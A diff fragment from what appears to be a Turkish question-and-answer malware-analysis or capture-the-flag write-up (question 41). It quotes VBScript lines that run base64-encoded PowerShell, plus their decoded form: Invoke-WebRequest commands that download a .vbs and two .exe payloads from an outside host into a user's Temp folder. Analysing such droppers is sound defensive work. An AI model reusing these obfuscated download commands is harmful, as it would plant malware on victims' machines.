@@ -1430,11 +1430,12 @@ Cevap:
     oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AYQBjAGMAZQBzAHMAdABvAGsAZQBuAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABSAGkAYwBrAE0AYQByAHQAaQBuAEcAcgBpAG0AZQBzAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAGMAYwBlAHMAcwBUAG8AawBlAG4ALgBlAHgAZQA="
     oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AQgBvAGQAeQBNAGEAcwBzAEkAbgBkAGUAeAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVQBzAGUAcgBzAFwAUgBpAGMAawBNAGEAcgB0AGkAbgBHAHIAaQBtAGUAcwBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAQgBvAGQAeQBNAGEAcwBzAEkAbgBkAGUAeAAuAGUAeABlAA=="
 ```
-
 ```Decoded:```
-```Invoke-WebRequest -Uri http://ofbahar.com/notamalware.vbs -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs```
-```Invoke-WebRequest -Uri http://ofbahar.com/accesstoken.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\AccessToken.exe```
-```Invoke-WebRequest -Uri http://ofbahar.com/BodyMassIndex.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\BodyMassIndex.exe```
+```
+Invoke-WebRequest -Uri http://ofbahar.com/notamalware.vbs -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs
+Invoke-WebRequest -Uri http://ofbahar.com/accesstoken.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\AccessToken.exe
+Invoke-WebRequest -Uri http://ofbahar.com/BodyMassIndex.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\BodyMassIndex.exe
+```
 
 
 # 41. Soru
